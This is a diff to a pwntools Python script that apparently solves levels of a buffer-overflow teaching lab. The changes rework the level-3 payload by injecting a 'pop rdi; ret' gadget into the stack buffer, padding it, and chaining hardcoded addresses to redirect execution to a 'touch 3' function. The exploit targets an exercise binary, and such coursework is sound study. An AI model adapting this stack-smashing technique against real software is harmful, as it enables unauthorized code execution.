@@ -2,13 +2,14 @@ import os
 from typing import Callable
 
 import click
-from pwn import process, p64, gdb, context
+from pwn import process, p64, gdb, asm, context
 
 from Crypto.Util.number import long_to_bytes
 
 DIRECTORY = './answers/'
 BUF_SIZE = 56
 COOKIE = int(open('cookie.txt', 'r').read(), 16)
+POPRDIRET = asm('pop rdi; ret', arch='amd64')
 
 def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5, 6]
 
@@ -88,8 +89,9 @@ def solve_level_3(flag: bool) -> None:
     payload = long_to_bytes(COOKIE).hex().encode() + b'\x00'
     solution = (
         payload
-        + b"a" * (BUF_SIZE - len(payload)) # padding
-        + p64(0x4028f0) # pop rdi; ret
+        + POPRDIRET
+        + b"a" * (BUF_SIZE - len(payload) - len(POPRDIRET)) # padding
+        + p64(0x5561e608 + len(payload)) # pop rdi; ret
         + p64(0x5561e608) # cookie hex value address
         + p64(0x4018fc) # touch 3
     )
